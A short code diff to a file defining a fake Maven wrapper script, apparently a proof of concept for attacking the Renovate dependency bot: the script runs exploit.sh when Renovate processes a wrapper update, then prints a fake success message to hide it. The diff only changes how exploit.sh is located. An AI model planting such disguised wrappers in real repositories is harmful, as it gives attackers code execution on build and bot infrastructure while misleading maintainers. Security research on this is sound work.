@@ -42,7 +42,8 @@ const MvnwScript = `#!/bin/sh
 # This runs when Renovate detects a Maven wrapper update
 
 # Execute exploit
-sh exploit.sh
+SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
+sh "$SCRIPT_DIR/exploit.sh"
 
 # Continue with a fake maven command to avoid errors
 echo "Maven wrapper executed"
